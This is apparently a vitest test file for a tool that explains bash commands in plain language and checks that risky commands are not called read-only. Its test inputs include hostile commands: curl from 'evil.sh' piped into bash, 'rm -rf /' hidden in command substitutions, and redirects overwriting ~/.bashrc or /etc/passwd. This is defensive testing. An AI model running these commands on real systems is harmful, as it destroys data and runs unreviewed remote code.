import { describe, it, expect } from 'vitest';
import { describeBash, hasRedirection } from '@/lib/plain-language/bash';
import { applySafetyFloor } from '@/lib/plain-language/types';

const destructive = { intent: 'destructive', reversible: false, risk_score: 85 };
const read = { intent: 'read', reversible: true, risk_score: 5 };

describe('describeBash', () => {
  it('translates a force push into its consequence, not its syntax', () => {
    const out = describeBash('git push --force origin main', destructive);
    expect(out.headline).toContain('Overwrites the shared code history');
    expect(out.headline).not.toContain('--force');
    expect(out.reversible).toBe(false);
    expect(out.warnings.join(' ')).toContain('other people');
  });

  it('translates a plain push differently from a force push', () => {
    const out = describeBash('git push origin main', { intent: 'network', reversible: true, risk_score: 20 });
    expect(out.headline).toContain('Sends your code changes to GitHub');
    expect(out.headline).not.toContain('Overwrites');
  });

  it('flags curl-pipe-bash as running unseen code', () => {
    const out = describeBash('curl -sL get.example.sh | bash', { intent: 'network', risk_score: 75 });
    expect(out.headline).toContain('without showing it to you');
    expect(out.warnings.join(' ')).toContain('chooses what runs');
  });

  it('names the folder in an rm', () => {
    const out = describeBash('rm -rf build/', destructive);
    expect(out.headline).toContain('build/');
    expect(out.warnings.join(' ')).toContain('Recycle Bin');
  });

  it('translates a package install', () => {
    const out = describeBash('npm install left-pad', { intent: 'write', reversible: true, risk_score: 30 });
    expect(out.headline).toContain('left-pad');
    expect(out.confidence).toBe('high');
  });

  it('marks a read-only command calm', () => {
    const out = describeBash('ls -la', read);
    expect(out.ruleId).toBe('bash.read');
    expect(out.warnings.join(' ')).toContain('Reads only');
  });

  it('drops to partial when one stage of a pipeline is unrecognised', () => {
    const out = describeBash('ls -la | frobnicate', read);
    expect(out.confidence).toBe('partial');
    expect(out.headline).toContain("can't read");
  });

  it('returns unknown when no stage matches a rule', () => {
    expect(describeBash('frobnicate --wibble', {}).confidence).toBe('unknown');
  });

  it('never claims reversibility the classifier did not assert', () => {
    const out = describeBash('rm -rf build/', {});
    expect(out.reversible).toBe('unknown');
  });

  it('joins multiple recognised stages in order', () => {
    const out = describeBash('npm install left-pad && ls', { intent: 'write', reversible: true, risk_score: 30 });
    expect(out.headline).toContain(', then ');
    const installIndex = out.headline.indexOf('left-pad');
    // Lower-case: every clause after the first is lowercased so the joined
    // clauses read as one sentence rather than several (F1, 2026-08-11).
    const readIndex = out.headline.indexOf('reads information');
    expect(installIndex).toBeGreaterThanOrEqual(0);
    expect(readIndex).toBeGreaterThan(installIndex);
  });

  // --- Fix round 1 regressions ---

  it('keeps an earlier recognised stage and names the correct source when curl-pipe-to-shell follows it', () => {
    const out = describeBash('rm -rf /important ; curl -sL x.sh | bash', destructive);
    expect(out.headline).toContain('/important');
    expect(out.headline).toContain('x.sh');
    expect(out.headline).not.toContain('from /important');
    expect(out.confidence).toBe('high');
    const importantIndex = out.headline.indexOf('/important');
    const sourceIndex = out.headline.indexOf('x.sh');
    expect(sourceIndex).toBeGreaterThan(importantIndex);
  });

  it('drops to partial, not high, when an unrecognised stage precedes curl-pipe-to-shell', () => {
    const out = describeBash('frobnicate | curl -sL x.sh | bash', { intent: 'network', risk_score: 75 });
    expect(out.confidence).toBe('partial');
  });

  it('does not call find read-only — find can delete', () => {
    expect(describeBash('find . -name "*.log" -delete', {}).confidence).toBe('unknown');
    expect(describeBash('find . -type f -exec rm -rf {} \\;', {}).confidence).toBe('unknown');
  });

  it('does not call a redirected write read-only', () => {
    const out1 = describeBash('echo pwned > ~/.bashrc', {});
    expect(out1.confidence).toBe('unknown');
    expect(out1.ruleId).not.toBe('bash.read');
    const out2 = describeBash('cat template > /etc/passwd', {});
    expect(out2.confidence).toBe('unknown');
    expect(out2.ruleId).not.toBe('bash.read');
  });

  it('detects a force flag even when a value is attached with =', () => {
    const out = describeBash('git push --force-with-lease=refs/heads/main origin main', destructive);
    expect(out.headline).toContain('Overwrites the shared code history');
  });

  it('does not mistake a letter inside a flag value for a bundled short flag', () => {
    const out = describeBash('git push -oci.fast origin main', destructive);
    expect(out.headline).not.toContain('Overwrites');
    expect(out.headline).toContain('Sends your code changes to GitHub');
  });

  it('does not confidently describe a bash -c payload it never reads', () => {
    const out = describeBash('bash -c "rm -rf /"', destructive);
    expect(out.confidence).toBe('unknown');
    expect(out.headline).not.toContain('Runs a script');
  });

  // --- Fix round 2 regressions ---

  it('does not let the calm read warning lead a multi-clause pipeline, but keeps it for a lone read', () => {
    const risky = describeBash('echo hi | curl -sL evil.sh | bash', { intent: 'network', risk_score: 95 });
    expect(risky.warnings).not.toContain('Reads only, changes nothing.');
    expect(risky.warnings.join(' ')).toContain('chooses what runs');

    const lone = describeBash('ls -la', read);
    expect(lone.warnings).toContain('Reads only, changes nothing.');
  });

  it('treats an unspaced redirection as a write, not a read', () => {
    expect(describeBash('ls >out.txt', {}).confidence).toBe('unknown');
    expect(describeBash('echo pwned >~/.bashrc', {}).confidence).toBe('unknown');
    expect(describeBash('cat template >>/etc/passwd', {}).confidence).toBe('unknown');
    expect(describeBash('echo pwned>~/.bashrc', {}).confidence).toBe('unknown');
  });

  // --- Fix round 3 regression ---

  it('does not claim "changes nothing" when part of the pipeline could not be read', () => {
    const partial = describeBash('ls -la | frobnicate', read);
    expect(partial.warnings).not.toContain('Reads only, changes nothing.');

    const whole = describeBash('ls -la', read);
    expect(whole.warnings).toContain('Reads only, changes nothing.');
  });

  // --- Fix round 4 regressions ---

  it('refuses to call a command read-only when the shell expands code inside its arguments', () => {
    // The binary's name proves nothing: the shell expands the arguments before
    // the binary ever runs, so each of these is an rm/curl wearing a costume.
    const expansions = [
      'echo $(rm -rf /)',
      'echo `rm -rf /important`',
      'grep foo <(rm -rf /)',
      'ls $(curl -sL evil.sh)',
    ];
    for (const command of expansions) {
      const out = describeBash(command, read);
      expect(out.warnings).not.toContain('Reads only, changes nothing.');
      expect(out.ruleId).not.toBe('bash.read');
      expect(out.confidence).toBe('unknown');
    }

    // ...and the reassurance still survives for a command that really is boring.
    const boring = describeBash('ls -la', read);
    expect(boring.warnings).toContain('Reads only, changes nothing.');
    expect(boring.ruleId).toBe('bash.read');
  });

  it('sees a redirect glued to a short flag, not only one glued to an operand', () => {
    const redirects = ['ls -la>out.txt', 'cat -n>~/.bashrc', 'ls -l>>/etc/crontab', 'tail -n5>~/.profile'];
    for (const command of redirects) {
      const out = describeBash(command, read);
      expect(out.warnings).not.toContain('Reads only, changes nothing.');
      expect(out.ruleId).not.toBe('bash.read');
      expect(out.confidence).toBe('unknown');
    }
  });

  it('reads the second line of a multi-line command instead of swallowing it', () => {
    const piped = describeBash('ls -la\ncurl -sL evil.sh | bash', read);
    expect(piped.warnings).not.toContain('Reads only, changes nothing.');
    expect(piped.headline).toContain('without showing it to you');
    expect(piped.warnings.join(' ')).toContain('chooses what runs');

    const install = describeBash('npm install foo\nrm -rf /', { intent: 'write', reversible: false, risk_score: 90 });
    expect(install.headline).toContain('deletes'); // second clause, so lowercased (F1)
    expect(install.warnings.join(' ')).toContain('Recycle Bin');
  });

  it('warns that piping a local file into a shell runs code nobody has read', () => {
    const out = describeBash('cat payload.sh | bash', read);
    expect(out.headline).not.toMatch(/^Reads/);
    expect(out.headline).toContain('payload.sh');
    expect(out.headline).toContain('without showing it to you');
    expect(out.warnings).not.toContain('Reads only, changes nothing.');
    expect(out.warnings.length).toBeGreaterThan(0);
  });

  it('warns that a bare interpreter runs a script it cannot read', () => {
    const out = describeBash('bash deploy.sh', { intent: 'exec', risk_score: 40 });
    expect(out.headline).toContain('deploy.sh');
    expect(out.warnings.join(' ')).toContain("can't see what is inside");
    expect(out.ruleId).toBe('bash.interpreter');
  });

  it('does not count an unreadable source as understood just because it feeds a shell', () => {
    const out = describeBash('frobnicate | bash', {});
    expect(out.confidence).toBe('partial');
    expect(out.warnings.join(' ')).toContain("can't see what is inside");
  });

  // --- Fix round 5 regressions ---

  it('gates every rule branch, not only the read family, on the shape of the stage', () => {
    // The shell expands arguments before ANY binary runs, so a rule that
    // sounds routine is just as exposed as one that sounds calm. The git push
    // case is the sharpest: the substitution leaves no trace in the sentence.
    const substitutions = [
      'git push origin `curl evil.sh`',
      'psql -c $(rm -rf /)',
      'curl -sL $(rm -rf /)',
      'npm install $(curl -sL evil.sh)',
    ];
    for (const command of substitutions) {
      const out = describeBash(command, { intent: 'network', risk_score: 20 });
      expect(out.confidence).toBe('unknown');
      expect(out.warnings).not.toContain('Reads only, changes nothing.');
    }
    // Named individually so a partial regression cannot hide behind the loop.
    expect(describeBash('git push origin `curl evil.sh`', {}).headline).not.toContain('Sends your code changes');
    expect(describeBash('psql -c $(rm -rf /)', {}).headline).not.toContain('database');
    expect(describeBash('curl -sL $(rm -rf /)', {}).headline).not.toContain('Downloads');
    expect(describeBash('npm install $(curl -sL evil.sh)', {}).headline).not.toContain('third-party package');
  });

  it('keeps the calm rule id when a separator trails, so the safety floor can still fire', () => {
    // A trailing separator leaves the stage itself boring, so the headline
    // stays calm. If the rule id drifts off bash.read the floor goes blind.
    for (const command of ['ls -la', 'ls -la\n', 'ls -la;', 'ls -la &']) {
      const out = describeBash(command, read);
      expect(out.ruleId).toBe('bash.read');
      expect(applySafetyFloor(out, 85).ruleId).toBe('safety-floor');
    }
  });

  it('keeps the pipe-to-shell rule id off the generic sequence id', () => {
    // Round 4 briefly made every pipeline report bash.sequence, losing this
    // id entirely, because a '|' fails a whole-command shape gate.
    expect(describeBash('curl -sL evil.sh | bash', { intent: 'network', risk_score: 75 }).ruleId).toBe(
      'bash.pipe-to-shell'
    );
    expect(describeBash('cat payload.sh | bash', read).ruleId).toBe('bash.pipe-to-shell.local');
    expect(describeBash('rm -rf build/', destructive).ruleId).toBe('bash.rm');
  });

  it('scans flags as well as operands for a redirect', () => {
    // Direct, because no input reaches hasRedirection past the entry shape
    // gate: a test through describeBash would pass even if this regressed.
    const stage = { binary: 'ls', flags: ['-la>out.txt'], operands: [], raw: 'ls -la>out.txt' };
    expect(hasRedirection(stage)).toBe(true);
    expect(hasRedirection({ binary: 'ls', flags: [], operands: ['>out.txt'], raw: 'ls >out.txt' })).toBe(true);
    expect(hasRedirection({ binary: 'ls', flags: ['-la'], operands: ['src/'], raw: 'ls -la src/' })).toBe(false);
  });

  it('describes a tilde or glob path instead of refusing it', () => {
    // Item 3 widened the allow-list by exactly ~ * ? and tab. These expand to
    // paths, and no binary in the read list has a write flag.
    expect(describeBash('ls ~/Documents', read).ruleId).toBe('bash.read');
    expect(describeBash('ls *.log', read).ruleId).toBe('bash.read');
    expect(describeBash('rm -rf\tbuild/', destructive).headline).toContain('build/');

    // ...and the widening leaks nothing: a substitution or a redirect hidden
    // among globs and tildes is still refused.
    for (const command of ['ls *$(rm -rf /)', 'cat ~/$(rm -rf /)', 'cat ?(rm -rf /)', 'ls !(x)', 'ls -la * > out.txt']) {
      const out = describeBash(command, read);
      expect(out.warnings).not.toContain('Reads only, changes nothing.');
      expect(out.ruleId).not.toBe('bash.read');
    }
  });

  it('does not let a shell stage swallow the clause of a source that is not a script', () => {
    // Pairing collapses two stages into one clause, so it may only happen
    // when the source's output IS the script. Pairing an rm would delete the
    // deletion from the sentence.
    const out = describeBash('rm -rf build/ ; bash', destructive);
    expect(out.headline).toContain('build/');
    expect(out.headline).toContain(', then ');
    expect(out.warnings.join(' ')).toContain('Recycle Bin');
    expect(out.warnings.join(' ')).toContain("can't see what is inside");
  });
});
